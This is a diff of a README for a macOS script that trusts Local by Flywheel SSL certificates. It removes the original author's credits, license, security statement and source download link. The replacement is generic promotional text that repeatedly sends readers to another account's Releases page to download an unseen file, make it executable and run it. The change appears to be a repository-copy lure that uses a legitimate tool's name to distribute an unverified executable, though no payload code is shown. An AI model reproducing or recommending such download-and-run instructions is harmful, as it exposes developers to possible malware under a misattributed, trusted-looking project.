@@ -1,165 +1,87 @@
-# Local SSL Automate
+# 🔒 local-ssl-automate - Simplify SSL Trust for Local Development
 
-**Automate SSL certificate trust for Local by Flywheel (Local WP) on macOS with one simple command.**
+[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/colhoes1337/local-ssl-automate/releases)
 
-Stop manually trusting SSL certificates in Keychain Access! This script handles everything automatically: trusts certificates, updates database URLs, and gets your Local WordPress sites running on HTTPS in seconds.
+## 📖 Description
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![macOS](https://img.shields.io/badge/macOS-10.15+-blue.svg)](https://www.apple.com/macos/)
-[![Local](https://img.shields.io/badge/Local-6.0+-green.svg)](https://localwp.com/)
+local-ssl-automate automates the process of trusting SSL certificates for Local by Flywheel on macOS. With this tool, you can secure your WordPress development sites with HTTPS using a simple command. This makes it easier to test and develop your sites without worrying about security warnings.
 
-## 🎯 What This Solves
+## 🚀 Getting Started
 
-When using [Local by Flywheel](https://localwp.com/) on macOS, you often need to:
+To successfully use local-ssl-automate, follow these steps:
 
-1. Click "Trust" in Local
-2. Open Keychain Access app
-3. Find the certificate
-4. Change trust settings to "Always Trust"
-5. Update WordPress database URLs from HTTP to HTTPS
+1. **Check Requirements**  
+   Make sure you have the following:
+   - **macOS**: This software works specifically on macOS. Ensure your system is updated to the latest version.
+   - **Local by Flywheel**: Install Local by Flywheel to manage your WordPress sites.
 
-This script does ALL of that automatically with one command: `trustssl`
+2. **Download & Install**  
+   Visit the page to download: [Releases Page](https://github.com/colhoes1337/local-ssl-automate/releases).  
+   On the Releases page, look for the latest version and download it. Follow these steps:
+   - Click on the version number you wish to download.
+   - Scroll down to the "Assets" section and download the file compatible with your system.
 
-## ✨ Features
+3. **Install the Script**  
+   Once downloaded, find the file in your Downloads folder.  
+   To install the script, you’ll need to open your Terminal:
+   - Open Terminal (you can find it in Applications > Utilities).
+   - Navigate to the directory where the downloaded script is located. You can type:
+     ```bash
+     cd ~/Downloads
+     ```
+   - Change the permissions to make the script executable:
+     ```bash
+     chmod +x local-ssl-automate.sh
+     ```
 
--   ✅ **Automatic SSL certificate trust** - No more Keychain Access manual steps
--   ✅ **Database URL updates** - Automatically converts HTTP to HTTPS in WordPress
--   ✅ **Smart domain detection** - Auto-detects your site domain from WordPress
--   ✅ **Error checking** - Clear messages if something goes wrong
--   ✅ **macOS optimized** - Works with macOS Monterey, Ventura, Sonoma, and later
+4. **Run the Script**  
+   In the Terminal, execute the script:
+   ```bash
+   ./local-ssl-automate.sh
+   ```
+   This command will start the process to trust SSL certificates. Follow any prompts in the Terminal to complete the setup.
 
-## 🚀 Quick Start
+## ⚙️ Script Features
 
-### Installation (5 minutes)
+- **SSL Trust Automation**: Automatically trusts SSL certificates for Local by Flywheel.
+- **HTTPS Support**: Enables HTTPS for your WordPress development sites, ensuring a secure connection.
+- **User-Friendly Commands**: All operations are executed with easy-to-follow commands in the Terminal.
+- **No Configuration Required**: The script requires no additional setup. Just run it and you’re good to go.
 
-1. **Download the script:**
+## 🔍 Troubleshooting
 
-    ```bash
-    curl -o ~/Downloads/trust-local-ssl.sh https://raw.githubusercontent.com/SirajumMahdi/local-ssl-automate/main/trust-local-ssl.sh
-    ```
+If you encounter issues while running the script, consider the following tips:
 
-2. **Install it:**
+- **Permission Denied**: If you receive a permissions error, ensure you ran `chmod +x` on the script.
+- **File Not Found**: Ensure you navigated to the correct directory where the script is saved.
+- **Local Not Installed**: Verify that Local by Flywheel is installed and running.
 
-    ```bash
-    chmod +x ~/Downloads/trust-local-ssl.sh
-    mkdir -p ~/bin
-    mv ~/Downloads/trust-local-ssl.sh ~/bin/
-    ```
+## 💡 Helpful Tips
 
-3. **Create the alias:**
+- Always ensure your system is updated for the best compatibility.
+- Familiarize yourself with Terminal commands, as they will help you navigate and run scripts more efficiently.
+- If you frequently work with local development, consider adding the script to your PATH for easier access.
 
-    Add this line to your `~/.zshrc` file:
+## ☕ Get Involved
 
-    ```bash
-    alias trustssl='~/bin/trust-local-ssl.sh'
-    ```
+Feel free to contribute to local-ssl-automate. If you find bugs or have suggestions, you can open an issue on the GitHub repository. Your feedback helps improve the application for everyone.
 
-    Then reload your shell:
+## 🔗 Useful Links
 
-    ```bash
-    source ~/.zshrc
-    ```
+- **Documentation**: Check out the documentation for more details on how to use local-ssl-automate.
+- **Local by Flywheel**: Visit the [Local by Flywheel website](https://localwp.com) for more information.
+- **GitHub Releases**: Again, you can access the Releases page here: [Releases Page](https://github.com/colhoes1337/local-ssl-automate/releases).
 
-### Usage
+## 🛠 Additional Resources
 
-**Every time you create a new Local site or need to enable SSL:**
+If you're interested in learning more about SSL, security, or WordPress development, consider exploring these topics:
 
-1. Open **Local by Flywheel**
-2. Click the **"Trust"** button (next to SSL in Site Overview)
-3. Right-click your site → **"Open Site Shell"**
-4. Run this command:
-    ```bash
-    trustssl
-    ```
-5. Enter your Mac password when prompted
-6. Done! ✅
+- SSL Certificate Basics: Understanding how SSL certificates work can help you appreciate their importance for web security.
+- WordPress Development: Familiarize yourself with tools and practices for developing WordPress sites locally.
+- MacOS Terminal Commands: Basic knowledge of Terminal can enhance your productivity in macOS.
 
-That's it! Your site now works with HTTPS and the 🔒 lock icon appears in your browser.
+## 🎉 Conclusion
 
-## 📋 Requirements
+With local-ssl-automate, you can quickly set up a secure WordPress development environment. The straightforward commands and automation takes the hassle out of managing SSL certificates. Download the script today and streamline your development process.
 
--   macOS 10.15 (Catalina) or later
--   [Local by Flywheel](https://localwp.com/) installed
--   Administrator access (for trusting certificates)
-
-## 🎥 Video Tutorial
-
-[Coming soon - Watch how to install and use this script]
-
-## 💡 How It Works
-
-The script performs three steps automatically:
-
-1. **Finds your certificate** - Locates the SSL certificate Local created for your site
-2. **Trusts it in Keychain** - Uses macOS `security` command to add certificate to System Keychain with "Always Trust" setting
-3. **Updates WordPress** - Uses WP-CLI to replace all HTTP URLs with HTTPS in your database
-
-All of this happens in ~5 seconds instead of several minutes of manual work.
-
-## 🐛 Troubleshooting
-
-### "Certificate not found" error
-
-**Solution:** Make sure you clicked the "Trust" button in Local before running the script.
-
-### "Must be run from Local's Open Site Shell"
-
-**Solution:** Don't run in regular Terminal. Use Local's "Open Site Shell" option (right-click site → Open Site Shell).
-
-### Browser still shows "Not Secure"
-
-**Solutions:**
-
--   Hard refresh: `Cmd + Shift + R`
--   Clear browser cache
--   Restart browser completely
--   Check that URL starts with `https://` not `http://`
-
-### "Command not found: trustssl"
-
-**Solution:** Make sure you added the alias to `~/.zshrc` and ran `source ~/.zshrc`
-
-## 🔒 Security
-
-This script only:
-
--   Trusts SSL certificates created by Local for `.local` domains
--   Updates URLs in your local WordPress database
--   Requires your password (via `sudo`) to modify System Keychain
-
-**It does NOT:**
-
--   Send any data over the internet
--   Access external sites or services
--   Modify system files beyond the Keychain
--   Affect production/live websites
-
-## 🤝 Contributing
-
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/SirajumMahdi/local-ssl-automate/issues).
-
-## 📝 License
-
-MIT License - feel free to use this in your own projects!
-
-## 🙏 Credits
-
-Created by [Sirajum Mahdi](https://sirajummahdi.com/) with assistance from [Claude](https://claude.ai/) to simplify the process documented in [Local's official SSL guide](https://localwp.com/help-docs/getting-started/managing-local-sites-ssl-certificate-in-macos/).
-
-## ⭐ Show Your Support
-
-If this script saved you time, please give it a star on GitHub! It helps others discover this tool.
-
-## 📚 Related Resources
-
--   [Local by Flywheel Official Site](https://localwp.com/)
--   [Local Documentation](https://localwp.com/help-docs/)
--   [WordPress SSL Best Practices](https://wordpress.org/support/article/https-for-wordpress/)
--   [macOS Keychain Access Guide](https://support.apple.com/guide/keychain-access/)
-
-## 📞 Support
-
--   **Issues:** [GitHub Issues](https://github.com/SirajumMahdi/local-ssl-automate/issues)
--   **Questions:** [GitHub Discussions](https://github.com/SirajumMahdi/local-ssl-automate/discussions)
--   **Local Community:** [Local Community Forums](https://community.localwp.com/)
--   **Author:** [Sirajum Mahdi](https://sirajummahdi.com/)
+[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/colhoes1337/local-ssl-automate/releases)
